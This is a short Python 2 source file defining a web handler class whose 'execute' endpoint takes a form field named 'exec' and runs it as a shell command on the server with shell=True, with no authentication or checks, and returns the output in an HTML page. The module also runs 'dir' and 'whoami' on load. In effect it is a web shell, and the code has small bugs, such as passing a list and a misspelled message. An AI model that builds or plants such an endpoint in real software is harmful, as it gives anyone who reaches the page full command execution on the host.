import subprocess

def execute(str):
    try:
        p = subprocess.check_output(str, stderr=subprocess.STDOUT, shell=True)
        print p
    except subprocess.CalledProcessError as e:
        print "Excetion: %s" % e.output;
        return e.output

    return p


execute('dir ..\\')

import cgi

class ExecApi:

    def index(self, server):
        server.send_response(200)
        server.send_header('Content-type', 'text/html')
        server.end_headers()
        output=""
        output+="Logged as: %s" % execute('whoami')
        server.wfile.write(output)

    def execute(self, server):
        server.send_response(200)
        server.send_header('Content-type', 'text/html')
        server.end_headers()
        ctype, pdict = cgi.parse_header(server.headers.getheader('content-type'))
        if ctype == 'multipart/form-data':
            fields = cgi.parse_multipart(server.rfile, pdict)
            command = fields.get('exec')
        output ="<html><body>"
        output+=" <b>Command: %s:</b>" %command[0]
        output+="<hr><br><pre>"
        output+=execute(command)
        output+="</pre></body></html>"
        server.wfile.write(output)
